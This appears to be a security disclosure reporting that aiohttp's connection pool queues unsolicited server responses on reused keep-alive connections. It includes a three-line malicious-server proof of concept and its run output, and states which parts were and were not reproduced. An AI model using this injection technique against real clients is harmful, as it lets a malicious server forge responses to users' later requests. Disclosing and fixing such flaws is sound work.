**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)

## Description

After a keep-alive connection is returned to the pool, `ResponseHandler` still parses and queues responses that the (malicious) server pushes without any request:

- `_get` in `aiohttp/connector.py` re-issues pooled connections checking connection state and idle time, but does not re-evaluate `should_close`;
- data arriving after the return is parsed by `feed_data` and appended to the handler's `_buffer` queue as a full `(message, payload)` item, so the poisoned connection stays eligible for reuse — the next request on it can be answered by an injected, attacker-chosen response (response mis-association).

Note on scope: on the current master snapshot, the injected response's **payload** `StreamReader` flow-control (pause_reading, from PR #13393/#13488 accounting) caps the in-flight injected *bytes* per connection, so I could not reproduce unbounded memory growth from a single connection — what is confirmed here is the queue accepting unsolicited responses and the connection remaining reusable.

## Impact

A malicious/compromised origin can poison pooled connections: after one normal request/response cycle, it injects a crafted response that the client will associate with a future, different request on that connection — a client-side response-smuggling primitive (credential-bearing responses can be forged for same-origin requests). Amplification of memory pressure would require many connections.

## PoC

Verified on current master snapshot. Raw-socket evil server: answer the first GET correctly (`Content-Length: 2`, body `ok`), wait 2 s for the client to read and return the connection to the pool, then push an unrequested response with a distinguishable header:

```python
conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok")   # legit response
time.sleep(2.0)                                                    # client returns conn to pool
conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 1048576\r\nX-Injected: 0\r\n\r\n" + b"X"*(1<<20))
```

Client: one `session.get()` + `read()`, then sleep; inspect the pooled handler.

## Execution result

```
[evidence] pooled conn queue length: 1, upgraded=False, should_close=False
[diag] queued item: code=200 headers={'Content-Length': '1048576', 'X-Injected': '0'}
[evidence] RSS grew 2.8 MiB while client sent no further requests
[RESULT] {"verdict": "PARTIAL",
          "confirmed": ["after return-to-pool, the connection still accepts an unsolicited
                         server response into its queue",
                        "should_close stays False; the poisoned connection remains eligible
                         for reuse (response-misassociation risk)"],
          "not_reproduced_on_this_snapshot": ["unbounded queue growth: the payload StreamReader
                         flow-control (pause_reading) caps in-flight injected bytes per connection"]}
```

The pooled handler holds the injected response (`X-Injected: 0`) while `should_close` is still `False` — i.e. the next request may be served from the attacker's preloaded response.
